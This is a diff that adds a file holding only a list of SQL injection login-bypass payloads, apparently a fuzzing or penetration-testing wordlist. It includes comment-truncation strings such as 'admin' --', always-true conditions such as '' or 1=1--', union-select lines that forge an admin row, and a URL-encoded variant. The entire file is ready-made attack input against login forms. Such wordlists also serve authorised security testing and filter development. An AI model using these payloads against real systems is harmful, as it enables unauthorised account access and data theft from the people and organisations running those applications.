@@ -1,0 +1,39 @@
+admin' --
+admin'-- -
+admin'#
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or 1=1--
+admin') --
+admin') or ('1'='1
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'#
+' or 1=1 limit 1--
+' or 1=1 limit 1#
+') or ('1'='1
+') or ('1'='1'--
+')) or (('1'='1
+" or 1=1--
+" or "1"="1
+" or ""="
+admin" --
+admin"#
+' or ''='
+'='
+'or''='
+1' or '1'='1
+' or 'x'='x
+' or true--
+' or 1--
+'||1--
+' union select 1,'admin','admin','x'--
+' union select 1,'admin','x','x','x'--
+administrator' --
+root' --
+' OR 1=1 OR ''='
+%27%20or%201%3D1--%20
